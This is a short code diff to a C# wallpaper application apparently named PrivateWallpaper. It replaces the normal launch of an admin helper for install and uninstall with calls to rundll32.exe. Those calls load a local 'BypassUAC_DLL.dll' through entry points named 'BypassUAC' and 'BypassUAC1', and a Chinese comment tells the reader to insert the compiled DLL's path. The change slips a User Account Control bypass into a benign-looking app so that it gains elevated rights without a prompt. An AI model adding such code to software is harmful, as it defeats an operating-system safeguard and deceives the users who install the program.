@@ -117,7 +117,11 @@ namespace PrivateWallpaper.Views
 
             try
             {
-                System.Diagnostics.Process.Start(adminTaskProgramFilePath, Assembly.GetExecutingAssembly().Location + " " + "install");
+                //System.Diagnostics.Process.Start(adminTaskProgramFilePath, Assembly.GetExecutingAssembly().Location + " " + "install");
+
+                var rundll32 = "C:\\Windows\\System32\\rundll32.exe";
+                var szDllPath = Environment.CurrentDirectory + "\\BypassUAC_DLL.dll";//替换为编译的dll路径
+                System.Diagnostics.Process.Start(rundll32, szDllPath + " BypassUAC");  
             }
             catch(Exception ex)
             {
@@ -132,7 +136,11 @@ namespace PrivateWallpaper.Views
 
             try
             {
-                System.Diagnostics.Process.Start(adminTaskProgramFilePath, Assembly.GetExecutingAssembly().Location + " " + "uninstall");
+                //System.Diagnostics.Process.Start(adminTaskProgramFilePath, Assembly.GetExecutingAssembly().Location + " " + "uninstall");
+
+                var rundll32 = "C:\\Windows\\System32\\rundll32.exe";
+                var szDllPath = Environment.CurrentDirectory + "\\BypassUAC_DLL.dll";//替换为编译的dll路径
+                System.Diagnostics.Process.Start(rundll32, szDllPath + " BypassUAC1");
             }
             catch(Exception ex)
             {
